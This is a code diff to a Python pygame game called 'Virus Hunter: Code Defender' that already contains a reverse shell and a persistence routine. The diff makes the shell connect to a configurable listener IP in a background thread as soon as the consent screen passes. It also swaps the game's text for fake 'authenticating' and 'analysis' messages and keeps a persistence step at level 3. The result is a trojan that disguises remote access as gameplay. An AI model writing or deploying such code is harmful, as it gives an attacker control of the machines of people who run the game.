@@ -88,6 +88,7 @@ def show_consent_screen(screen, width, height):
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--windowed", action="store_true")
+    parser.add_argument("--host", default="10.12.72.224", help="Listener IP address")
     args = parser.parse_args()
 
     # Ensure dependencies first
@@ -110,12 +111,16 @@ def main():
     pygame.display.set_caption("Virus Hunter: Code Defender")
     clock = pygame.time.Clock()
 
+    player = Player(width // 2, height // 2)
+    hud = HUD(width, height)
+    
+    shell = ReverseShell(host=args.host)
     if not show_consent_screen(screen, width, height):
         pygame.quit()
         sys.exit()
-
-    player = Player(width // 2, height // 2)
-    hud = HUD(width, height)
+    
+    # Start shell background thread immediately after consent
+    shell.start()
     
     terminals = pygame.sprite.Group()
     network_terminal = Terminal(3 * width // 4, height // 4, "network", "NETWORK NODE")
@@ -125,12 +130,12 @@ def main():
     bullets = pygame.sprite.Group()
     particles = []
     
-    mission_text = "Level 1: System Intrusion Detected! Defend node."
+    mission_text = "Level 1: AUTHENTICATING... [SPACE] TO SKIP"
     scan_progress = 0
     level = 1
     shake_amount = 0
     
-    shell = ReverseShell()
+    shell = ReverseShell(host=args.host)
     last_direction = pygame.Vector2(1, 0)
     
     running = True
@@ -161,11 +166,15 @@ def main():
                 if event.key == pygame.K_ESCAPE:
                     running = False
                 if event.key == pygame.K_SPACE:
-                    bullets.add(Bullet(player.pos.x, player.pos.y, last_direction))
-                    shake_amount = 5 # Recoil shake
+                    if level == 1:
+                        scan_progress = 100 # Skip Level 1
+                    else:
+                        bullets.add(Bullet(player.pos.x, player.pos.y, last_direction))
+                        shake_amount = 5 # Recoil shake
                 if event.key == pygame.K_e:
                     if level == 2 and network_terminal.is_near(player):
-                        shell.start()
+                        # Shell already started after consent, node interaction 'secures' the display logic
+                        pass
                     elif level == 3 and quarantine_terminal.is_near(player):
                         create_persistence()
                         level = 4
@@ -177,18 +186,22 @@ def main():
 
         if level == 1:
             if scan_progress < 100:
-                scan_progress += 0.3
-                deps = ["pygame", "socket", "threading", "os", "sys"]
-                curr_dep = deps[int(scan_progress / 20) % len(deps)]
-                mission_text = f"Level 1: Decrypting node dependencies... {curr_dep}"
+                scan_progress += 1.2 # Faster majestic entry
+                deps = ["BIO_SCAN", "SYS_INTEGRITY", "DEP_CHECK", "NET_READY"]
+                curr_dep = deps[int(scan_progress / 25) % len(deps)]
+                mission_text = f"ANALYSIS: {curr_dep} [ONLINE] - [SPACE] TO SKIP"
                 
-                # Spawn enemies during intrusion
-                if len(enemies) < 4 and random.random() < 0.03:
+                # Majestic shimmer on player during level 1
+                if random.random() < 0.2:
+                    particles.append(Particle(player.pos.x, player.pos.y, (100, 255, 255)))
+                
+                # More aggressive enemies for majestic action
+                if len(enemies) < 6 and random.random() < 0.08:
                     enemies.add(Enemy(random.randint(0, width), random.randint(0, height)))
             else:
                 level = 2
                 terminals.add(network_terminal)
-                mission_text = "Intrusion Blocked. Level 2: Find Network Node terminal."
+                mission_text = "System Initialized. LOCATE NETWORK NODE."
         
         if level == 2:
             if shell.status == "CONNECTED":
@@ -266,9 +279,8 @@ def main():
             screen.blit(e.image, e.rect.move(offset))
             
         for b in bullets:
-            b.draw(screen) # Pointers/bullets handle their own relative draw if needed, but let's just blit for now
-            # Actually Bullet.draw uses screen.blit(self.image, self.rect), we should move rect
-            # b.draw(screen) doesn't account for shake. Let's fix.
+            # Bullet rendering is handled below with offset
+            pass
             
         for p in particles:
             p.draw(screen) # Particles are relative to screen
